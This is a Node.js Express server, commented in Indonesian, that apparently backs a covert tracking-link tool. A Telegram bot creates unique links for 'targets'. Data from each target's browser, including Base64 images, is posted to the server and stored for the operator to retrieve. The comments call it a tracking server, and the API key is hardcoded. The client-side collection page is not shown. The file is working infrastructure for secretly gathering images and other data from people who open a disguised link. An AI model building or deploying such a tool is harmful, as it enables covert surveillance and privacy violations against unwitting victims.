const express = require('express');
const { v4: uuidv4 } = require('uuid');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json({ limit: '10mb' })); // Menaikkan limit untuk menerima gambar Base64
app.use(express.static(path.join(__dirname, 'public'))); // Menyajikan file statis dari folder public

// PERINGATAN: Database di memori, akan hilang jika server restart. Gunakan database nyata untuk produksi.
const tracking_data = {};
const API_KEY = "lelang18"; // Ganti dengan kunci Anda

// Middleware untuk proteksi API
const apiKeyAuth = (req, res, next) => {
    const apiKey = req.headers['x-api-key'];
    if (apiKey && apiKey === API_KEY) {
        next();
    } else {
        res.status(403).json({ status: "error", message: "Unauthorized: Invalid API Key" });
    }
};

// Halaman utama yang disajikan ke target
// Tidak perlu route khusus karena sudah ditangani `express.static`
// Pengguna akan membuka: https://your-app.onrender.com/?id=uuid-string

// Endpoint untuk menerima data dari browser target
app.post('/api/data', (req, res) => {
    const { link_id, data } = req.body;
    if (!link_id || !data) {
        return res.status(400).json({ status: "error", message: "Data tidak lengkap" });
    }
    
    // Cari dan perbarui data
    let found = false;
    for (const userId in tracking_data) {
        for (const alias in tracking_data[userId]) {
            if (tracking_data[userId][alias].link_id === link_id) {
                tracking_data[userId][alias].last_data = {
                    ...data,
                    timestamp: new Date().toISOString()
                };
                found = true;
                break;
            }
        }
        if (found) break;
    }

    if (found) {
        console.log(`Data diterima untuk link_id: ${link_id}`);
        res.json({ status: "sukses" });
    } else {
        res.status(404).json({ status: "error", message: "Link ID tidak ditemukan" });
    }
});


// --- API Endpoints untuk Bot Telegram (Diproteksi dengan API Key) ---

app.post('/api/create_link', apiKeyAuth, (req, res) => {
    const { user_id, alias } = req.body;
    if (!user_id || !alias) {
        return res.status(400).json({ status: "error", message: "user_id dan alias diperlukan" });
    }

    const link_id = uuidv4();
    // Link sekarang menggunakan query parameter agar lebih mudah disajikan oleh `express.static`
    const link_url = `${req.protocol}://${req.get('host')}/?id=${link_id}`;

    if (!tracking_data[user_id]) {
        tracking_data[user_id] = {};
    }
    
    tracking_data[user_id][alias] = {
        link_id: link_id,
        last_data: null,
        link: link_url
    };
    
    console.log(`Link dibuat untuk user ${user_id} dengan alias ${alias}`);
    res.json({ status: "sukses", link: link_url });
});

app.get('/api/get_data/:user_id/:alias', apiKeyAuth, (req, res) => {
    const { user_id, alias } = req.params;
    const trackingInfo = tracking_data[user_id]?.[alias];

    if (trackingInfo && trackingInfo.last_data) {
        res.json({ status: "sukses", data: trackingInfo.last_data });
    } else {
        res.status(404).json({ status: "error", message: "Data belum tersedia atau alias tidak ditemukan" });
    }
});

app.post('/api/delete_link', apiKeyAuth, (req, res) => {
    const { user_id, alias } = req.body;
    if (tracking_data[user_id]?.[alias]) {
        delete tracking_data[user_id][alias];
        res.json({ status: "sukses", message: `Link untuk ${alias} berhasil dihapus.` });
    } else {
        res.status(404).json({ status: "error", message: "Alias tidak ditemukan" });
    }
});


app.listen(PORT, () => {
    console.log(`Server pelacakan berjalan di port ${PORT}`);
});